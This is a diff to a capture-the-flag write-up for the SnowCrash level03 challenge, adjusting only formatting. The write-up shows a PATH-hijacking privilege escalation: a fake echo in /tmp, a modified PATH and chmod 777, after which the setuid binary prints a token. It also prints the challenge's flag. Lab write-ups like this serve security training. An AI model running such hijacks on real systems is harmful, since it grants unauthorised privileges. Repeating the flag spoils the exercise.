@@ -9,6 +9,7 @@ A quick reverse engineering of the binary shows us that it uses the system funct
 The binary can execute getflag because it is owned by flag03
 
 We start by creating a fake echo that will just getflag
+
 ```bash
 echo getflag > /tmp/echo
 ```
@@ -20,6 +21,7 @@ export PATH=/tmp:$PATH
 ```
 
 Eventually we give everybody the rights to execute this file
+
 ```bash
 level03@SnowCrash:/tmp$ chmod 777 echo
 ```
@@ -29,4 +31,4 @@ level03@SnowCrash:~$ ./level03
 Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
 ```
 
-**Flag** : qi0maab88jeaj46qoumi7maus
+**Flag:** qi0maab88jeaj46qoumi7maus
